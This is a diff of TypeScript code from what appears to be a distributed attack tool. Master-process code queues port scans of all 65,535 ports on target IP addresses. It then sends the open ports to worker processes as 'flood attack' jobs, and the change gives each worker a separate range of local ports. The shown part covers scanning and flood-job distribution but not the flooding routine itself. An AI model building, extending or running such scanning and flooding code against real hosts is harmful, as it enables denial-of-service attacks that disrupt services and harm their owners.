@@ -11,6 +11,8 @@ const workers: cluster.Worker[] = [];
 let portScanQueue: BeeQueue;
 let floodAttackQueue: BeeQueue;
 
+const maxPort = 65535;
+
 export interface IPScanTask {
   ip: string;
   port: number;
@@ -18,6 +20,7 @@ export interface IPScanTask {
 
 export interface FloodTask {
   targets: IPScanResult[];
+  localPorts: [number, number];
 }
 
 export async function startMaster () {
@@ -102,7 +105,6 @@ function spawnWorkers (): cluster.Worker[] {
 }
 
 async function createIpScanTasks (queue: BeeQueue, ipAddresses: string[]) {
-  const maxPort = 65535;
   for (let i = 0; i < ipAddresses.length; i++) {
     // create 65535 tasks in parallel
     let promises = [];
@@ -120,17 +122,31 @@ async function createIpScanTasks (queue: BeeQueue, ipAddresses: string[]) {
 }
 
 async function createFloodTasks (queue: BeeQueue, openPorts: IPScanResult[]) {
-  let task: FloodTask = { targets: openPorts };
-  // create one task per worker
-  // consider spreading evenly among workers instead of all workers on all targets.
   let promises = [];
+  // for this part we create a number of tasks equal to the number of worker processes to make sure work is spread evenly.
   for (let i = 0; i < workers.length; i++) {
+    // localPorts assigned to this process
+    let startPort = Math.ceil(1 + (maxPort / workers.length) * i);
+    let endPort = Math.floor(startPort + maxPort / workers.length);
+
+    if (endPort > maxPort) {
+      endPort = maxPort;
+    }
+
+    let localPorts: [number, number] = [startPort, endPort];
+    let task: FloodTask = {
+      targets: openPorts,
+      localPorts: localPorts
+    };
+
     promises.push(queue.createJob(task).save());
   }
+
+  await Promise.all(promises);
 }
 
 async function awaitQueueEmpty (queue: BeeQueue) {
-  return new Promise((resolve, reject) => {
+  return new Promise((resolve) => {
     const resolveIfQueueEmpty = async () => {
       let health = await queue.checkHealth();
 
